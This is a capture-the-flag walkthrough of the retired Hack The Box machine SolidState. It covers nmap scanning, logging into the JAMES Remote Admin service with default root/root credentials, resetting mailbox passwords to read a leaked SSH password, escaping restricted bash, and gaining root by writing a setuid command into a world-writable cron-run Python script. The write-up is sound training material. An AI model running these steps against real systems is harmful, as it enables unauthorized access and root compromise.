# SolidState

This is the write-up for the box SolidState that got retired at the 27th January 2018.
My IP address was 10.10.14.23 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.51    solidstate.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/solidstate.nmap 10.10.10.51
```

```markdown
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey:
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp  open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.23 [10.10.14.23]),
80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp open  pop3    JAMES pop3d 2.3.2
119/tcp open  nntp    JAMES nntpd (posting ok)
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Full TCP port range scan:
```markdown
nmap -p- -T5 -o nmap/ss-allports.nmap 10.10.10.51
```

```markdown
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip
```

Scanning for vulnerabilities on these services:
```markdown
nmap -p 22,25,80,110,119,4555 -sC -sV -o nmap/ss-vulns.nmap --script vuln 10.10.10.51
```

```markdown
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| smtp-vuln-cve2010-4344:
|_  The SMTP server is not Exim: NOT VULNERABLE
|_sslv2-drown:
80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.51
|   Found the following possible CSRF vulnerabilities:
(...)
110/tcp  open  pop3        JAMES pop3d 2.3.2
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown:
119/tcp  open  nntp        JAMES nntpd (posting ok)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown:
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

The web page looks like a generic company website that offers security consulting services.
All the pages are HTML and there is a contact form that seems to do nothing after submitting.

## Checking JAMES Remote Admin (Port 4555)

When connecting to port 4555 with `nc`, it outputs **JAMES Remote Administration Tool 2.3.2** and wants us to enter a login ID and a password.
After trying out some default credentials, the login ID _root_ and the password _root_ is valid.
With the command `HELP` the tool shows what we can do.

```markdown
listusers

Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

It is possible to change the password of these users:
```markdown
setpassword mailadmin newpass1

Password for mailadmin reset
```

As some mail ports are open, lets try to access the mailbox of these users with any mail client such as _Evolution_.
After resetting the passwords of all users, only the user _mindy_ has an interesting email with the subject _"Your Access"_:
```markdown
Dear Mindy,

Here are your ssh credentials to access the system. Remember to reset your password after your first login.
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

The credentials work on SSH and we are logged in as _mindy_:
```markdown
ssh mindy@10.10.10.51
```

## Privilege Escalation

In the home folder there is a _bin_ folder but when trying to access it, it says _"-rbash: cd: restricted"_ which means that _mindy_ is in **restricted bash**. Looking at _/etc/passwd_ confirms that:
```markdown
james:x:1000:1000:james:/home/james/:/bin/bash
mindy:x:1001:1001:mindy:/home/mindy:/bin/rbash
```

To get out of it we can SSH into the box with a command:
```markdown
ssh mindy@10.10.10.51 bash
```

This will execute **bash** and the user is not restricted anymore so we can execute any command. Lets start any **Linux Enumeration script** to get an attack surface on the box:
```markdown
curl 10.10.10.51 -o LinEnum.sh

bash LinEnum.sh -t
```

After analyzing it, there is the file _/opt/tmp.py_ that has write and execute permissions for everyone.
The Python script just cleans the _/tmp_ directory. As it is writeable by anyone, we can put our own commands in there:
```python
#!/usr/bin/env python
import os
import sys
try:
     os.system('/usr/bin/touch /tmp/test')
except:
     sys.exit()
```

Saving this and waiting for a couple of minutes, a cronjob will execute this and create the file _/tmp/test_ that is owned by root.
Now change the script to set a **Setuid bit** on a binary that executes a shell, so we can execute it with root permissions.
```python
os.system('chmod 4755 /bin/dash')
```

After the cronjob runs the Setuid bit is set on _/bin/dash_ and we can execute `dash`.
This starts a shell in which the _effective user ID (EUID)_ is root and the box is done!
